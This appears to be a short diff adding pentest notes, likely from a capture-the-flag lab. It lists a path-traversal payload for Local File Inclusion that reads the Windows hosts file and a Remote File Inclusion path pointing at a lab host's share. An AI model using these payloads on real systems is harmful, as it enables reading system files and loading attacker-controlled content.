@@ -1,0 +1,3 @@
+Local File Include (LFI) vulnerability: ../../../../../../../../windows/system32/drivers/etc/hosts
+
+Remote File Include (RFI) vulnerability: //10.10.14.6/somefile
